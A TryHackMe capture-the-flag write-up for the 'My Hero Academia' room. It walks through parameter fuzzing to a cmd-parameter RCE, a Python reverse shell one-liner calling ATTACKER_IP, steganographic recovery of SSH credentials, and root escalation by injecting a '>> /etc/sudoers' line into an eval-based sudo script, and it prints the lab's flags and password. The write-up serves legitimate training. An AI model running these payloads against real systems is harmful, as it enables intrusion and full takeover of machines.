# My Hero Academia — TryHackMe Writeup
> **Platform:** TryHackMe | **Difficulty:** Medium | **Category:** Web, Steganography, Privilege Escalation

---

## Overview

This machine exposes a web server with a hidden PHP file vulnerable to Remote Code Execution via an unprotected `cmd` parameter. Output is Base64-encoded, obscuring the RCE at first glance. After gaining a foothold as `www-data`, credentials are recovered through a hidden directory and steganographic data embedded in a JPEG image. Final privilege escalation abuses a sudo script that passes user input directly to `eval`, with an incomplete blocklist that fails to filter the `>>` redirection operator — allowing a write to `/etc/sudoers` as root.

**Attack Chain:**
```
Nmap → Directory fuzzing → Parameter fuzzing → RCE (Base64) 
→ Reverse shell → Hidden passphrase → Steganography → SSH as deku 
→ eval injection → root
```

---

## Step 1 — Reconnaissance

```bash
sudo nmap -Pn -sV -O 10.65.145.2
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Two open ports. SSH requires credentials, so the web server on port 80 is the entry point.

---

## Step 2 — Directory Fuzzing

Visiting the root of the web server returns a standard page with no obvious attack surface. Running Gobuster against it:

```bash
gobuster dir -u http://10.64.132.198/ -w big.txt
```

```
.htpasswd     (Status: 403)
.htaccess     (Status: 403)
assets        (Status: 301) [--> http://10.64.132.198/assets/]
server-status (Status: 403)
```

The `/assets/` directory returns a blank page. Fuzzing it further reveals a PHP file:

```bash
gobuster dir -u http://10.64.132.198/assets/ -w big.txt
```

```
images    (Status: 301) [--> http://10.64.132.198/assets/images/]
index.php (Status: 200) [Size: 0]
```

`/assets/index.php` also returns a blank page — likely waiting for a parameter.

---

## Step 3 — Parameter Fuzzing → RCE Discovery

Fuzzing for GET parameters using a common parameter wordlist:

```bash
gobuster fuzz -u http://10.64.132.198/assets/index.php?FUZZ=id \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  --exclude-length 0
```

```
[Status=200] [Length=72] [Word=cmd] 
→ http://10.64.132.198/assets/index.php?cmd=id
```

The `cmd` parameter triggers a response. However, the output is not plaintext — it is Base64-encoded:

```
dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
```

Decoding it:

```bash
echo "dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK" | base64 -d
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Remote code execution confirmed as `www-data`. Every command response is Base64-encoded.

---

## Step 4 — Reverse Shell

Setting up the listener on the attack machine:

```bash
nc -lvnp 9999
```

Sending the reverse shell payload via URL-encoded curl:

```bash
curl -g 'http://10.66.169.120/assets/index.php?cmd=python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket()%3Bs.connect((%22ATTACKER_IP%22%2C9999))%3B%5Bos.dup2(s.fileno()%2Cf)for%20f%20in(0%2C1%2C2)%5D%3Bpty.spawn(%22sh%22)%27'
```

The raw payload before URL encoding:

```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

Shell received:

```
Connection received on 10.66.169.120 47292
$ whoami
www-data
```

---

## Step 5 — Hidden Directory → Passphrase

Exploring the web root reveals a directory named `Hidden_Content`:

```bash
$ ls /var/www/html
Hidden_Content  html

$ ls /var/www/html/Hidden_Content
passphrase.txt

$ cat /var/www/html/Hidden_Content/passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==
```

Decoding:

```bash
echo "QWxsbWlnaHRGb3JFdmVyISEhCg==" | base64 -d
```

```
AllmightForEver!!!
```

Passphrase saved for later use.

---

## Step 6 — Flag Blocked, Pivoting to Steganography

The user flag exists but is inaccessible as `www-data`:

```bash
$ cat /home/deku/user.txt
cat: user.txt: Permission denied
```

Two images are found in the web assets:

```bash
$ ls /var/www/html/assets/images/
oneforall.jpg  yuei.jpg
```

Serving them over HTTP from the victim machine:

```bash
$ python3 -m http.server 8000
```

Downloading on the attack machine:

```bash
wget http://<TARGET_IP>:8000/oneforall.jpg
wget http://<TARGET_IP>:8000/yuei.jpg
```

`oneforall.jpg` has corrupt magic bytes. Repairing with `magicbytes.py`:

```bash
python3 magicbytes.py -i oneforall.jpg -m jpg
# → Magic bytes has been changed of oneforall.jpg as jpg
```

Extracting hidden data with `steghide`, using the passphrase found earlier:

```bash
steghide extract -sf oneforall.jpg
# Enter passphrase: AllmightForEver!!!
# → wrote extracted data to "creds.txt"

cat creds.txt
```

```
Hi Deku, this is the only way I've found to give you your account credentials,
as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

---

## Step 7 — SSH as `deku` → User Flag

```bash
ssh deku@<TARGET_IP>
```

```bash
deku@ip-10-65-163-21:~$ cat user.txt
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
```

**User flag captured.**

---

## Step 8 — Privilege Escalation via `eval` Injection in sudo Script

Checking sudo permissions:

```bash
sudo -l
```

```
User deku may run the following commands:
    (ALL) /opt/NewComponent/feedback.sh
```

Inspecting the script:

```bash
cat /opt/NewComponent/feedback.sh
```

```bash
#!/bin/bash
echo "Enter your feedback:"
read feedback

if [[ "$feedback" != *"\`"* && "$feedback" != *")"*  && \
      "$feedback" != *"\$("* && "$feedback" != *"|"* && \
      "$feedback" != *"&"* && "$feedback" != *";"*  && \
      "$feedback" != *"?"* && "$feedback" != *"!"*  && \
      "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"
    echo "$feedback" >> /var/log/feedback.txt
else
    echo "Invalid input."
fi
```

### Vulnerability Analysis

The script runs as root via sudo and passes user input directly into `eval "echo $feedback"`. A blocklist attempts to prevent injection by filtering:

| Blocked | Character |
|---------|-----------|
| `` ` `` | Backtick |
| `)` | Closes subshell |
| `$(` | Command substitution |
| `\|` | Pipe |
| `&` | Background/AND |
| `;` | Command separator |
| `?` | Glob / shell special |
| `!` | History expansion |
| `\` | Escape character |

**Critical omission:** the `>` and `>>` redirection operators are not blocked.

### How the Exploit Works

When the input is:
```
deku ALL=NOPASSWD: ALL >> /etc/sudoers
```

The script executes:
```bash
eval "echo deku ALL=NOPASSWD: ALL >> /etc/sudoers"
```

Since the script runs as root, this appends the sudoers rule to `/etc/sudoers`, granting `deku` unrestricted passwordless sudo access.

### Exploitation

```bash
sudo /opt/NewComponent/feedback.sh
```

```
Enter your feedback:
deku ALL=NOPASSWD: ALL >> /etc/sudoers

It is This:
Feedback successfully saved.
```

Verifying the new permissions:

```bash
sudo -l
```

```
User deku may run the following commands on ip-10-65-172-147:
    (ALL) /opt/NewComponent/feedback.sh
    (root) NOPASSWD: ALL
```

Escalating to root:

```bash
sudo su
```

```bash
cat /root/root.txt
```

```
THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
```

**Root flag captured.**

---

## Summary of Findings

| Step | Vulnerability | Impact |
|------|--------------|--------|
| Initial Access | Unauthenticated RCE via `cmd` parameter in `index.php` | Remote code execution as `www-data` |
| Credential Leak | Passphrase stored in plaintext in a hidden web directory | Enabled steganography extraction |
| Lateral Movement | SSH credentials hidden via steganography in JPEG image | SSH access as `deku` |
| Privilege Escalation | `eval` injection via unfiltered `>>` redirect in privileged sudo script | Full root access |

---

## Key Takeaways

- **Never expose command execution via GET parameters** — a `?cmd=` endpoint with no authentication is a critical RCE vulnerability regardless of output encoding.
- **Base64 encoding is not security** — it obscures output but does nothing to prevent exploitation.
- **Sensitive files should not be stored under the web root** — the `Hidden_Content` directory was directly accessible via HTTP.
- **Steganography can be used to exfiltrate or hide credentials** — always check images found on a server.
- **Blocklists for shell injection are inherently incomplete** — `eval` with user input is dangerous no matter what characters are filtered. Use allowlists or eliminate `eval` entirely.
- **`>>` redirection** is a commonly overlooked injection vector that becomes critical when a script runs as root.